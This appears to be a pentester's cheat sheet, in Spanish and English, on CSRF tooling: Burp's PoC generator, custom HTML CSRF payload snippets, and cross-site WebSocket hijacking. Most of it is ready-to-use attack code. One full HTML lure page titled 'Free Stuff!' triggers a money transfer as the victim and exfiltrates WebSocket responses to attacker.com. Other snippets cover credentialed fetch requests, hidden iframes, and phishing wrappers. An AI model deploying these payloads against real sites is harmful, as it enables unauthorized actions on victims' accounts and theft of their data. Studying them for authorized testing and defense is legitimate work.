---
aliases:
  - CSRF PoC Generator
  - Burp CSRF
  - CSWSH PoC
tags:
  - type/cheatsheet
  - vuln/csrf
  - technique/discovery
  - technique/initial-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Cross-Site Request Forgery (CSRF)]]'
  - '[[Burp Suite]]'
---
# CSRF - Tooling

***

## Burp PoC Generator

| **Objetivo** | **Acción** | **Notas** |
|:---:|:---:|:---:|
| Generar PoC HTML | Right-click request → Engagement Tools → "Generate CSRF PoC" | Built-in Burp Pro. |
| Forms POST regulares | Burp arma `<form>` auto con todos los fields | Default. |
| Multipart forms | Burp soporta `multipart/form-data` PoC | enctype handled. |
| Forms con JSON | Burp ofrece "Include auto-submit script" + texto plano hack | Limited — manual mejor. |
| Forms con XHR | Burp puede generar fetch / XMLHttpRequest PoC en tab "Options" | Variante moderna. |
| Cross-site issue identification | Active scanner detecta endpoints sin token CSRF | Run scan first. |
| Test PoC en browser | "Test in browser" button copia HTML a clipboard, abre en navegador | Workflow rápido. |
| PoC con cross-site WebSocket | Burp Pro ofrece ws-csrf PoC también | Nuevo. |
| Customizar fields | Editor de Burp permite cambiar values antes de generar | Pre-tweaking. |
| Save PoC HTML | Save as `.html` para enviar en bug report | Reportable artifact. |
^csrf-tool-burp

### Workflow generate PoC

```
1. Burp → Proxy → HTTP history
2. Identify state-changing request (POST, PUT, DELETE)
3. Right-click → Engagement tools → Generate CSRF PoC
4. Inspect generated HTML — verify auto-submit
5. Save as poc.html, host on attacker domain
6. Visit logged-in target → click PoC link → action triggers
```

___

## Custom HTML PoCs

| **Tipo** | **Snippet base** | **Notas** |
|:---:|:---:|:---:|
| Form auto-submit POST | `<form action="..." method="POST"><input name="..." value="..."></form><script>document.forms[0].submit()</script>` | Standard. |
| Form GET-based | `<img src="..." style="display:none">` | Para SameSite=Lax bypass. |
| Form text/plain JSON | `<form enctype="text/plain"><input name='{"k":"v","_":' value='_"}'></form>` | JSON CSRF. |
| Form multipart upload | `<form enctype="multipart/form-data"><input type="file" name="upload"></form>` | File upload CSRF. |
| Form con multiple submits | Loop de iframes con distintos form actions | Mass attack. |
| fetch + credentials | `fetch('...', {method:'POST', credentials:'include', body:'...'})` | Modern XHR. |
| XHR clásico | `var x=new XMLHttpRequest(); x.open(...); x.withCredentials=true; x.send(...);` | IE compat. |
| sendBeacon | `navigator.sendBeacon(url, body)` | Async, no response — perfect para CSRF "fire and forget". |
| Iframe wrapper | `<iframe src="malicious.html" style="display:none">` | Embed PoC. |
| Multi-stage chain | Login CSRF → wait → action CSRF | Sequential PoCs. |
| Phishing wrapper | UI realista + PoC silencioso de fondo | Social engineering. |
| Auto-redirect chain | `<meta refresh>` → secondary PoC | Multi-step. |
^csrf-tool-html-poc

___

## CSWSH PoC Builder

| **Objetivo** | **Snippet** | **Notas** |
|:---:|:---:|:---:|
| WebSocket basic | `const ws = new WebSocket('wss://target/'); ws.onopen=()=>ws.send('cmd');` | Vanilla. |
| Steal incoming msgs | `ws.onmessage=(e)=>fetch('//attacker/log?d='+encodeURIComponent(e.data))` | Exfil to attacker. |
| Auth handshake | Cookies se envían en handshake automáticamente | Sin trabajo extra. |
| Inject custom protocol | `new WebSocket(url, ['protocol-name'])` | Si server requiere subprotocol. |
| Multi-message flow | `ws.onopen` + secuencia de sends | Reproducir state machine. |
| Combine con XSS | XSS injecta el script CSWSH en target | Same-origin chain. |
| Burp WebSocket extension | Burp Pro tiene WebSocket Repeater | Para test directo de WS. |
| ZAP WebSocket support | OWASP ZAP también | Alternativa free. |
| websocat CLI | `websocat wss://target/` | Test manual sin browser. |
| wscat | `wscat -c wss://target/ -H "Cookie: session=..."` | Manual con cookie. |
^csrf-tool-cswsh

### CSWSH PoC completo

```html
<!DOCTYPE html>
<html>
<body>
<h1>Free Stuff!</h1>
<script>
  const ws = new WebSocket('wss://target.com/api/socket');
  ws.onopen = () => {
    // Acción que el atacante quiere ejecutar como victim
    ws.send(JSON.stringify({type: 'transfer', to: 'attacker', amount: 1000}));
  };
  ws.onmessage = (event) => {
    // Exfil de respuestas (incluyendo info sensible)
    fetch('https://attacker.com/exfil?data=' + encodeURIComponent(event.data));
  };
  ws.onerror = (err) => {
    fetch('https://attacker.com/log?err=' + err.message);
  };
</script>
</body>
</html>
```

Cuando victim visita esta página atacante autenticado a target → handshake con cookies → server acepta WS → atacante recibe todas las respuestas vía exfil endpoint.

***
